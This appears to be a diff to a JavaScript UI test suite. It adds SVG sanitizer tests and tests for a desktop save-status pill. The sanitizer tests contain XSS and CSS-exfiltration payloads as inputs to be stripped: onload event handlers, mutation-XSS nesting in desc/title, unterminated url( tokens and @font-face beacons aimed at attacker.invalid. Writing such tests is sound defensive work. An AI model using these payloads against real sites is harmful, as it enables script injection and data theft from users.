@@ -1190,6 +1190,26 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
     return !/\bon\w+\s*=/i.test(out);
   }},
+  { name: "Event handler on <style> stripped (bare)", fn: async () => {
+    // <style> is a common SVG/HTML element: a surviving on* handler goes live on
+    // the HTML re-parse. Must be stripped like any other element's handler.
+    const out = sanitizeSvgMarkup('<style onload="alert(1)">.a{fill:#000}</style><rect/>');
+    return !/\bon\w+\s*=/i.test(out);
+  }},
+  { name: "Event handler on <style> nested in <desc>/<title> stripped (mXSS)", fn: async () => {
+    // desc/title are HTML integration points — the classic namespace-confusion
+    // mutation-XSS setup. Neither the nested handler nor a top-level one survives.
+    const a = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><rect/>');
+    const b = sanitizeSvgMarkup('<title><style onload="alert(1)">x</style></title><rect/>');
+    return !/\bon\w+\s*=/i.test(a) && !/\bon\w+\s*=/i.test(b);
+  }},
+  { name: "SVG output has no handler after HTML re-parse (mXSS backstop)", fn: async () => {
+    // Independent output-side check: whatever survives must be inert when the
+    // sink re-parses it as HTML — no element carries an on* handler.
+    const out = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><g onclick="alert(2)"><rect/></g>');
+    const html = new DOMParser().parseFromString(`<div>${out}</div>`, "text/html");
+    return ![...html.querySelectorAll("*")].some((el) => [...el.attributes].some((at) => /^on/i.test(at.name)));
+  }},
   { name: "script element stripped", fn: async () => {
     const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
     return !/<script/i.test(out);
@@ -1237,6 +1257,33 @@ uiSuite("SVG Sanitizer (XSS)", [
   { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
     const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
     return !/attacker\.invalid/i.test(out);
+  }},
+  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
+  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
+  // paren-balanced regex missed both the bare and quoted unterminated forms.
+  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
+    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
+    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
   }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
@@ -1914,6 +1961,57 @@ uiSuite("Move Picker Search (F6)", [
     if (bd) _click(bd); await _wait(150);
   }},
 ], { setup: _editorSetup });
+
+// Desktop save-status pill (CR3) — the "no hint or error" half of the Windows
+// silent-save bug. Drives the app's save-status channel (window.__velaOnSaveStatus,
+// wired by the app effect; nl-boot feeds it from deck-io on the real desktop) and
+// asserts the pill's state machine + the Retry affordance. Stable test-ids:
+//   save-status-pill  (data-save-state = saving|saved|failed|reconnecting)
+//   save-status-retry / save-failed-toast / save-failed-toast-retry
+const _savePill = () => _$('[data-testid="save-status-pill"]');
+const _saveState = () => { const p = _savePill(); return p ? p.getAttribute("data-save-state") : null; };
+uiSuite("Desktop save-status pill (CR3)", [
+  { name: "channel wired: window.__velaOnSaveStatus is a function", fn: async () => {
+    if (typeof window.__velaOnSaveStatus !== "function") throw new Error("save-status channel not wired");
+  }},
+  { name: "saving → saved renders the pill with 'Saved' copy", fn: async () => {
+    window.__velaOnSaveStatus({ state: "saving", at: Date.now() });
+    await _waitFor(() => _saveState() === "saving", 2000);
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "saved" ? _savePill() : null), 2000);
+    if (!/Saved/.test(pill.textContent || "")) throw new Error("saved pill missing copy: " + pill.textContent);
+  }},
+  { name: "failed save surfaces a Retry pill + one-shot toast (not swallowed)", fn: async () => {
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock write reject" });
+    const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+    if (!/Retry/i.test(pill.textContent || "")) throw new Error("failed pill missing Retry: " + pill.textContent);
+    await _waitFor(() => _$('[data-testid="save-failed-toast"]'), 2000);
+  }},
+  { name: "Retry invokes __velaForceSave and returns to Saved", fn: async () => {
+    const orig = window.__velaForceSave;
+    let called = 0;
+    window.__velaForceSave = () => { called++; window.__velaOnSaveStatus({ state: "saved", at: Date.now() }); };
+    try {
+      window.__velaOnSaveStatus({ state: "failed", at: Date.now() });
+      const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+      _click(pill);
+      if (called < 1) throw new Error("__velaForceSave was not called by Retry");
+      await _waitFor(() => _saveState() === "saved", 2000);
+    } finally {
+      window.__velaForceSave = orig;
+    }
+  }},
+  { name: "reconnecting renders an amber pill; then cleans up", fn: async () => {
+    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "reconnecting" ? _savePill() : null), 2000);
+    if (!/Reconnect/i.test(pill.textContent || "")) throw new Error("reconnecting copy missing: " + pill.textContent);
+    // Cleanup so the pill/toast don't leak into later suites.
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(60);
+    window.__velaOnSaveStatus(null);
+    await _waitFor(() => _savePill() == null, 1500).catch(() => {});
+  }},
+]);
 
 // ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
